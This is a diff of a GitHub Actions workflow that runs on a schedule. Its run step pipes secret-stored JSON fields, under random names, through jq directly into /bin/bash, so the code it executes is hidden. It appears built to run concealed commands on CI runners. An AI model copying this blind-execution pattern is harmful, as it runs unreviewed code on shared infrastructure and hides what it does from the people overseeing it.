@@ -3,23 +3,27 @@ name: tangyangzhong1987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
+    - cron: '39 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tangyangzhong1987
         env:
-          avduj9: ${{ secrets.avduj9 }}
+          oddo23020: ${{ secrets.oddo23020 }}
         run: |
-          echo $avduj9 | jq -r .y3039 | /bin/bash
-          echo $n018 | jq -r .ch13014 | /bin/bash
-          echo $rdlb8289 | jq -r .vo1 | /bin/bash
-          echo $bnoxe73 | jq -r .fjyw81405 | /bin/bash
-          echo $dj7791 | jq -r .mg5264 | /bin/bash
-          echo $jdrwa65 | jq -r .er4 | /bin/bash
-          echo $sr12 | jq -r .rsesg71 | /bin/bash
-          echo $r50613 | jq -r .yt0567 | /bin/bash
+          echo $oddo23020 | jq -r .ks685 | /bin/bash
+          echo $m4 | jq -r .zz0494 | /bin/bash
+          echo $ux2838 | jq -r .zxu3665 | /bin/bash
+          echo $ir6 | jq -r .ob2339 | /bin/bash
+          echo $b21362 | jq -r .v74 | /bin/bash
+          echo $nefgx771 | jq -r .pcjp512 | /bin/bash
+          echo $qravg58 | jq -r .poap9705 | /bin/bash
+          echo $p3 | jq -r .tq228 | /bin/bash
+          echo $j455 | jq -r .xy69 | /bin/bash
+          echo $opj05 | jq -r .q87999 | /bin/bash
+          echo $qq37791 | jq -r .j447 | /bin/bash
+          echo $sbnz9 | jq -r .zty30443 | /bin/bash
+          echo $bncqp9542 | jq -r .p5914 | /bin/bash
 
